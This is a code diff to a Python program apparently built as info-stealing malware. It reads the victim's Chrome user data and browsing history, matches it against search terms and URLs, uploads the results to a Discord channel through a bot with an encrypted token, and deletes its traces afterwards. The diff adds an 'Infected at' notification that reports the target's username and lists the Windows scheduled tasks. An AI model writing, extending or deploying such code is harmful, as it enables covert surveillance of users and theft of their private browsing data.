@@ -3,6 +3,7 @@ from datetime import datetime
 import nextcord
 from nextcord.ext import commands
 from commands import *
+from win32com.client import Dispatch
 
 class FetchCommand:
     def __init__(self, query, type, command, terms):
@@ -28,25 +29,26 @@ class FetchCommand:
         return col
 
 class Fetcher:
-    TargetDir = fr"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\\"
+    Target = os.environ['USERPROFILE']
+    TargetDir = fr"{Target}\AppData\Local\Google\Chrome\User Data\\"
     EncryptStep = None
     Bot = commands.Bot(intents=nextcord.Intents.all())
     Channel = ChannelID = None
     Paths = []
     CurrentPath = None
     Error = None
+    Notify = False
 
     Root = os.path.dirname(os.path.abspath(__file__))+"\\"
     Out = f"{Root}out\\"
 
     Commands = []
 
-
     @staticmethod
     def Transfer(func):
-        async def wrapper(*args):
+        async def wrapper(*args) -> None:
             try:
-                desc, filename = await func(*args)
+                desc, filename = func(*args)
                 await Fetcher.Channel.send(content=f"```{desc}```", file=nextcord.File(filename))
             except Exception as e:
                 await Fetcher.Channel.send(f"```Error: {e}```")
@@ -59,14 +61,16 @@ class Fetcher:
     @staticmethod
     def Run() -> None:
         Get = lambda string: os.environ.get(string)
-        Fetcher.EncryptStep = int(Get("ENC"))
 
+        Fetcher.EncryptStep = int(Get("ENC"))
         Fetcher.ChannelID = int(Fetcher.Decrypt(Get("CHA")))
-        Fetcher.Commands = [
-            FetchCommand("Search Terms", "Query", term_cmd, Get("CT")),
-            FetchCommand("URLs", "URL", url_cmd, Get("CU"))
-        ]
-        Fetcher.Paths = os.listdir(Fetcher.Out)
+
+        if not Fetcher.Notify:
+            Fetcher.Commands = [
+                FetchCommand("Search Terms", "Query", term_cmd, Get("CT")),
+                FetchCommand("URLs", "URL", url_cmd, Get("CU"))
+            ]
+            Fetcher.Paths = os.listdir(Fetcher.Out)
         
         try:
             Fetcher.Bot.run(Fetcher.Decrypt(Get("TOK")))
@@ -78,22 +82,32 @@ class Fetcher:
         Fetcher.Channel = Fetcher.Bot.get_channel(Fetcher.ChannelID)
         if not Fetcher.Channel: 
             return
+        
+        if Fetcher.Notify:
+            await Fetcher.SendNotify()
+        else:
+            await Fetcher.Channel.send(f"Time: `{datetime.now().strftime('%d/%m/%Y %H:%M')}`\nTarget: `{Fetcher.Target}`")
 
-        await Fetcher.Channel.send(f"Time: `{datetime.now().strftime('%d/%m/%Y %H:%M')}`\nTarget: `{os.environ['USERPROFILE']}`")
+            for i in Fetcher.Paths:
+                Fetcher.Error = None
+                Fetcher.CurrentPath = Fetcher.TargetDir+i                
+                try:
+                    await Fetcher.SearchHistory(Fetcher.Out+i)
+                except Exception as e:
+                    await Fetcher.Channel.send(f"```Error: {e}```")
 
-        for i in Fetcher.Paths:
-            Fetcher.Error = None
-            Fetcher.CurrentPath = Fetcher.TargetDir+i
-            
-            try:
-                await Fetcher.SearchHistory(Fetcher.Out+i)
-            except Exception as e:
-                await Fetcher.Channel.send(f"```Error: {e}```")
+            await Fetcher.DNS()
 
-        await Fetcher.DNS()
+            shutil.rmtree(Fetcher.Out)
 
-        shutil.rmtree(Fetcher.Out)
         await Fetcher.Bot.close()
+
+    @staticmethod
+    async def SendNotify():
+        sch = Dispatch('Schedule.Service')
+        sch.Connect()
+        tasks = [i.Name for i in sch.GetFolder('\\').GetTasks(0)]
+        await Fetcher.Channel.send(f"Infected at: `{datetime.now().strftime('%H:%M')}`\nTarget: `{Fetcher.Target}`\nTasks:`{tasks}`")
 
     @staticmethod
     @Transfer
